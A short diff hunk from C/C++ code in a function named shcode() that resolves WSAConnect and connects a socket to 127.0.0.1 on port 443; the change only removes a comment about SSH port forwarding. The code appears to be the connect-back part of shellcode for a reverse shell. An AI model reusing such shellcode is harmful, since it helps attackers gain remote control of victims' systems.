@@ -92,7 +92,7 @@ __declspec(noinline) void shcode()
 
     sockaddr_in saddr = {};
     saddr.sin_family = AF_INET;
-    saddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //doesn't work over SSH port forwarding - a solution required
+    saddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
     saddr.sin_port = htons(443);
     pWSAConnect(s, (SOCKADDR*)&saddr, sizeof(saddr), NULL, NULL, NULL, NULL);
 
